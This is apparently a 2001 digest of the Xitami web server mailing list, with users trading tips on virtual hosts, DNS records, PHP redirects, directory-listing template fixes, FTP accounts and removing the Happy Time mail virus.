
Message-ID: <0c3801c14635$166e4160$020aa8c0@Master>

What Mr. Soulkoff is referring to:

In the defaults.cfg file, under the virtual hosts section:

<snippit>
[Virtual-hosts]
     www.mayanarch.com=mayanarch.cfg
     mayanarch.com=mayanarch.cfg
     www.thinkincircles.com=thinkincircles.cfg
     thinkincircles.com=thinkincircles.cfg
     www.simangroup.com=simangroup.cfg
     simangroup.com=simangroup.cfg
...
...
<snippit>

THEN, in your DNS server you must configure, A Records only:
     mayanarch.com    A    xxx.xxx.xxx.xxx
     www.mayanarch.com    A    xxx.xxx.xxx.xxx
    thinkincircles.com    A    xxx.xxx.xxx.xxx
    www.thinkincircles.com    A    xxx.xxx.xxx.xxx
    ...
    ...

This, of course, is assuming that xxx.xxx.xxx.xxx is the SAME IP address for
each of your VHosts.  Once the DNS reference is made for www.domain.com AND
domain.com then anyone who types either name into their browser will find
your server.  Once the request gets to your server, then the Xitami config
above will allow users, typing either name, to get to the correct site.

If you only have www.domain.com configured, and someone types
http://domain.com then that user won't ever get to your VHost because
www.domain.com and http://domain.com are physically TWO different DNS names
and they must each of their own DNS entry.  The same goes for Xitami.

That's what I do. 

Be sure you delete all non-essential FTP accounts and use good
password on the account that does have access.

One of the mails on the mailing list recd today contains the Happy Time
virus ... seems like someone's machine has been infected and the virus has
sent out a mail to the xitmai mailing list as well.

The Symantec web site's removal tool, fixhaptime.exe, could not remove it
from my Netscape mail file - perhaps because it is embedded within the mail
file. The only solution on Netscape was to open the file in MS Word and to
delete the "script" ... search for "Rem I am sorry! happy time" - this is
the first line in the VB script element of the HTML formatted message.
Delete the lines between the <script language='VBScript'> and the </script>
tags and save the file again.

For details on the virus search on google for "VBS.Haptime.A" - this will
provide a URL to the Symantec web site that has details.

>  http://homeinwinipeg.dyns.cx gets me Welcome To Xitami v2.5b4 and not my web page. What am I missing.

What I am seeing is a "blank" page, Netscape says "Done" but the
activity bar is still moving. Nothing happens, Netscape times-out. 

When I Stop Netscape and View Source on the "blank" page, I get a valid
HTML file with a FrameSet that refers to IP numbers that are in a 
private range: 

 <FRAMESET ROWS="100%,*" FRAMEBORDER="0" BORDER="0" FRAMESPACING="0">
 <FRAME NAME="main" SRC="http://10.1.1.50:80/">
 <FRAME>
 <NOFRAMES>

homeserver</A></CENTER>
 </NOFRAMES>
 </FRAMESET>

The IP number 10.1.1.xx won't pass over the internet, so the frames stay
blank for me (it may be why you are seeing something locally).

With IE6, I get a message from the Dynamic DNS provider then am redirected
to a .cx domain, the DNS provider.

Hi,

I run Xitami under Win32 (last version I think : v2.5 b5)
I have problems with a known bug (regard to list archives) :

the redirection using a local address :

ex with php scripts
<?php header ("Location: test.htm")  ?>           doesn't work
<?php header ("Location: http://127.0.0.1/test.htm")  ?>           is ok

has someone solve this problem ?
can you test these scripts and give me (if it works!)  the version number 
of the Xitami server you use

Thanks

bye
Franck

Hi Frank

try <?php header ("Location: ./test.htm")  ?>

but be aware that while complete paths take a little typing, they always
work.

When your server send a response, it can be a 200 OK or an error message, 
but it could also be a redirection.
The redirection command is decoded by the browser client. It must be a 
complete path (but some browser could use a relative path, relative to the 
page that calls the redirection).

Ah! That could be the difference then!
I do not start Xitami from the command prompt, but from the start
menu->Internet Tools->Xitami Webserver - Windows.
Maybe that's the graphical interface?

I'll RTFM to see how to start from the command prompt or run as a
service.

Thanks,

Hi all,

I have been working with Xitami for NT for a couple of years now.  Am =
much more used to NT environs, however, I am about to install a Linux =
Red Hat OS on a new server.  Will Xitami for Unix work on a Linux =
system?

Yup.  It's one of our test/development platforms.   Providing you
install the devleopment tools for Linux you shouldn't have a problem
installing Xitami.

Use something else than Outlook!
For everything Bill Gates invented, there is actually a better alternative:
Outlook ---> Eudora
Publisher ---> Pagemaker
IIS  ---> Xitami
Windows (all flavors) ---> Unix (all flavors)
and so on...

thank's,
I read elsewhere that when the redirection was with an absolute path 
(http://  etc etc ...)
It was done by the client.
And when the redirection was relative, It was done by the server

I have a french version, but let's try :

This way, to read an e-mail you'll have to double click on it. THIS IS =

But MS Outlook should be like this also.

As for protection try norton anti-virus 2001, it checks your outlook =
accounts when you get the mail, and erases the infected file before it =
can attack.
and allways go to the symantec.com site to get the latest virus =

Hope this can help.

Hello all, I've got a little problem with my cgi. I'm tyring to use FormMail
to submit forms vial the web. (I've used it on other xitami servers with no
problems) When I post the form I get an error msg. saying the website cant

It is there. I've also run the test cgi in xitami and it worked fine.

Paulo is right. If you uncheck the preview pane you must doubleclick the =
message header before it opens. If the preview pane is on, the message =
will pop up immediatelly in it. This is not a good thing if you want to =
delete a message. You have to click it first. If you have selected to =
show preview pane the message will appear there as soon as you click it =
once. With preview pane off you can delete message without opening it. =
This way it is possible to get rid of messages that look suspicious.

Give www.dns2go.com a look. They are set up for dynamic DNS, but I have a
static IP. I just insattled teh client once and configured it to point
my server when I am offline (which is never). It works quite well. You can
get an address like www.mydomain.dns2go.com for the exciting price of
$0.00.

I use Discount Domain Registry.com.  $15 a year with lots of free
extras.  All features are web-based, I believe.  GoDaddy.com I think is
cheaper, but for some things, you need to send in paper work.

I would have to reccomend godaddy.com, it's $8.95USD/year (it gets
cheaper the more years you register for), and it's really easy to get
everything set up.

Another option is joker.com, I think they're around the same price, but
I have no experience with them.

I would have to reccomend godaddy.com, it's $8.95USD/year (it gets
cheaper the more years you register for), and it's really easy to get
everything set up.

Another option is joker.com, I think they're around the same price, but
I have no experience with them.

I use BulkRegister.com.  If you are going to register a lot of domains, then
this is the way to go.  Their interface is easy and without all the NetSol
confusion.  their tech support is better also.

You pay an entry fee, which sucks, but if you register more than 10 domains
it pays itself back quick.

I pay as low as $8 to $10 dollars depending on my volume or their specials.

What do I need to type into the "path" field?? a URL, a domain, or a

I am assuming the alias needs an domain entry as such: www.mydomain.com

Ewen,

Well,  after a bit of deliberation,  and after some quick trials and tests,
it certainly does appear that .....

Simply changing the  applicable references  in the   'httpdir.gsl'   file
from   "nameurl"   to  "name"   does the trick on my system.
The directory lists, and all of  the file downloads now function as
typically expected.  A file named as "qwerty.exe" downloads or runs under
that same name,  and any other file(name) performs or downloads as that same
file(name).  No more double extensions or redundant/different extensions.

Thanks for that terrific tip and pointer.

Regards,
	Wally..

The extra extension tends to happen if you already have the file
downloaded to that directory; at least one common webbrowser handles this
situation by appending "(1)" to the filename.

The double extension issue is more puzzling; IIRC this used to happen
with Xitami 2.5b5 (it may still happen there), due to an extremely
conservative test for which characters don't need to be escaped in the
filename, resulting in the filename being escaped, and another extension
added by the webbrowser.  (If you think this is hitting you, in 2.5b5, try
substituting "name" for "nameurl" in httpdir.gsl and restarting.)

Off hand I can't think of anything in Xitami 2.4d9 which would cause
this effect, except possibly if the same code that causes the 2.5b5
effect is also in 2.4d9.

Does anyone else see this extension doubling in 2.4d9?

Message-ID: <5.1.0.14.2.20010928142254.009e9920@pop.idx.com.au>

Hi,
I was wondering if someone could help me with a few problems I was having?
I'm using Xitami 2.5b4 on Windows 98 for testing of my websites.

When I try to open a plain well-formed XML file I get the message:
"The URL you asked for does not exist on this website"
If I try to open a file with an XML extension, but with not actual XML in 
it I get the message:
"You are not authorised to access this resource"

And my other problem; when clicking on a link in a directory listing the 
URL in the address bar will come up like so:
http://127.0.0.1/test%2Ephp
Even though the URL in the link was http://127.0.0.1/test.php

This causes a problem with PHP scripts as the script output is cached and 
the script won't actually run again if you reload.

I hope you can help me with these problems!

Thanks in advance!

Regards,
David

Same problem here, with 2.5b4 on Win95.  I reported this a few months
ago, and the only recommendation I got was to make sure Xitami was
out in it's own directory; ie not under 'Program Files'.  I tried that
and it didn't help.  I'm still hoping someone can come up with a solution.

I'm having the same problem. Along with another problem. My cgi is not
working properly. When I'm calling a script from the web I get an error
saying "The URL you asked for does not exist on this website." And of course
it is sitting in the cgi-bin with everything else. But something I noticed.
I set xitami to allow viewing of the cgi-bin and the only thing I see is a
test.html and a testcgi.exe   PLEASE help me.

Thanks

I would bet you have an invalid character in the directory name. 

Also note that "webserver" is not an 8.3 filename; the ones that work
for you are 8.3 style. Which command prompt are you using (Command or
CMS) and what editor are you using? 

Directory corruption isn't handled by DeFrag, except as a side effect.
Open the Properties of that drive, select Tools, click "Error Checking". 

Or (believe it or not) at the command line, run "CHKDSK D:". Just like
DOS. And like DOS, it won't fix unless you add " -F". One difference: on
NTFS, you can't do a ChkDsk with fix-up while the volume is mounted, but
it will offer to run it at the next boot.

Which offers another thought-- NT's filesystem is usually good but
sometimes loses track. Re-boot is rarely needed but often worth a try
when things seem wrong. NT does most sanity-checking at boot.

Dude, you were so right!!!!

I can't believe it was so basic a problem....I changed the names of the
directories to 8 characters long and I could CD all day long....Son of a
B----!  Here I was looking for some complicated problem and completely over
looked one of the most basic and simple concepts.   Its DOS format, duh!!!!

Thanx

If that is how you want to spend all day . . . <G>

But seriously. It IS possible to navigate the NT command line with
long-names. 

Names with spaces need quotes, of course. 

And NT offers at least two command interpreters. "COMMAND" tries to be
similar to DOS; "CMD" has some new tricks. 

Either one should handle long-names.... but I know if I shell out from a
16-bit program I get a short-name 8.3 view of the filesystem. Invoking
Start, Run, "COMMAND", OK gives a longname world. Certain types of
shortcuts seem to force a SFN 8.3 world. 

That's why I was asking what editor you used and how you were getting to
a command line. Think about how you get there. Run "DIR" a lot because
it will show if you've dropped into 8.3-land.

The default readme file you find under Xitami's FTP says the following:

Uploads are not allowed into
this directory.  Connect with user name 'upload', password 'upload' to
send files to this system.

It lets someone upload to this directory in my server.  I guess someone can
now upload a lot of junk if they wanted to.

On the flip side, it wont let me log in with my superuser password!!!???

How do I get rid of this, and create FTP accounts for the users and
passwords created under VHosts????

None of the FTP directories created under VHosts are working.  What do I
need to do to create these FTP directories....and insure that only the users
with passwords have access to them?

This is fixed by the same name/nameurl fix that ewen mentioned fixing 
the double extension issue.

You need to modify the httpdir.gsl (or better copy it, modify the copy 
and use the copy instead of the original) in the templates directory.

Line 89 is in the original form:

<A HREF="$(urlbase:)$(nameurl:)"><IMG SRC="$(icon)" 
BORDER=0>$(name:)</A></TD>

You should change this to :

<A HREF="$(urlbase:)$(name:)"><IMG SRC="$(icon)" BORDER=0>$(name:)</A></TD>

Personally I think this is the correct behaviour. Nameurl seems to be a 
bit too escaped to be useful for anything

Not sure how one might get Gartner to mention Xitami as one of the alternatives

use IIS for anything...

Thanks! This actually works!

Just as Rod and David I had installed PHP and had the same problem as
they described and this is now fixed!

FT> Personally I think this is the correct behaviour. Nameurl seems to be a
FT> bit too escaped to be useful for anything

I would suggest that in the original distribution line 89 in the
httpdir.gsl is changed too.
This  will  prevent  problems  for other new Xitami/Windows/PHP users.
(Yes,  we  do  exist,  first  we discovered ASP, than PHP...eventually
we'll probably discover linux as well ;-)).

I like the way The Register reported on this:

they come: a kind of "flee now - and don't wait around to collect your
possessions" warning."

At my university, I have been culling hits on Xitami by CodeRed and
Nimda that come from machines in our IP block, and reporting them to IS,
so they can fix the MS IIS holes.

Subject: [Xitami] Xitami hangs
Message-ID: <66137859576.20010930112121@iglobal.com>

Hello Xitami World,

As a very happy, long time user of Xitami, I accidentally upgraded/installed beta 2.5b1 on our win2000 box (latest SP and patches).  It
worked well for several weeks then as we began to *use* it, Xitami
would hang, no http or admin access.  The local console would not
respond and "stopping" the process failed.  The only way to end it was
to go to the command prompt and "Kill" it.  It may hang three times a
day or once in three days.

The details -

* Clean install on a new box with Win2000 with full SP and patches
* Two other process running small mail server (a dozen accounts) and
FTP.
* 512 meg, 30 gig hd
* Event logger says.." Xitami unexpectedly terminated"  and "restart
failed because an instance of Xitami is all ready running"
* The log file shows nimda at work but the hanging does not seem to be
related to the nimda hit times
* Loads of "...glsgen E: can't open schema file..."  errors
* No relevent errors in other log files (access or errors)
* The system is now in *use* so I hesitate in doing anything that
might cause the system to be down for painfully-long time :0

The questions -
1. Does these issues sound like a beta problem?
2. Can I load a production version *over* the beta without introducing
disaster?
3. Any other suggestions are appreciated!
  

Best regards,
 Irv                          mailto:xitami@iglobal.com

Hello everyone :o)

I recently installed v2.5b4.

If anyone in the lists is familiar with virtual reality worlds and objects
paths, maybe you can help.

In activeworlds many of the people I host vr worlds for have lost their free
object paths like xoom, etc.

Installed Xitami to host their object paths and they are able to upload via
ftp with no problems to the default root directory.

However, the objects, avatars, textures, etc. are timed out trying to render
for viewing in their worlds.

I am running from my IP (fixed) as the http and can access the index.html
which reads Forbidden and is how I set it up for privacy.

Activeworlds runs on ports 5670 and 7777 and is an SDK based browser.

Thought it may be my zapro firewall, but no such luck even when I shut it
down for testing.
